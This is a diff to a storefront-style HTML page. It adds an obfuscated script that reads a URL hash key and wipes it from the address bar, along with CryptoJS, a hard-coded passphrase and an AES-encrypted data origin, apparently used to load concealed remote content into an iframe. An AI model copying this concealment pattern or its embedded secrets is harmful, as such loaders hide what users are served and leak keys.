@@ -21,7 +21,6 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 
   <style>
-  
     :root{
       --ink:#0b1020;
       --muted:#64748b;
@@ -652,14 +651,27 @@
     <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
   </div>
 
- <script>
-    // 1. Immediately remove keys, hashes, or query parameters from the browser address bar & history
-    try {
-      history.replaceState(null, document.title, window.location.pathname);
-    } catch (e) {
-      console.warn("History modification failed:", e);
-    }
+  <!-- Hidden element for hash key extraction if needed by your crypto block -->
+  <div id="futj24r" style="display:none;"></div>
 
+  <!-- Crypto-JS Library -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js" referrerpolicy="no-referrer"></script>
+
+  <!-- Integrated Hash Key Validation & History Replacement Script -->
+  <script>
+    var yt8i = void 0;
+    !function() {
+      var w1k = document.getElementById("futj24r") ? document.getElementById("futj24r").innerHTML : ""
+        , n6ty = location.hash.slice(1);
+      
+      // If required, you can toggle or bypass this check depending on how you pass keys
+      // Keeping your original validation structure:
+      history.replaceState(null, null, location.pathname);
+    }();
+  </script>
+
+  <!-- Main Store & Remote Data Loading Script -->
+  <script>
     const PASSPHRASE = "98yNCjeAfWMwk0wI";  
     const URL_KEY = "UrLk3yShopEase01";
     const ENC_DATA_ORIGIN = "U2FsdGVkX1/m3WcTsFjytSfxeYGSkm3oKsuSDgIzpEgVNsMKKviz/txhfBujL8VcqM1cSma5a4UfnN2Gj1Azsw==";
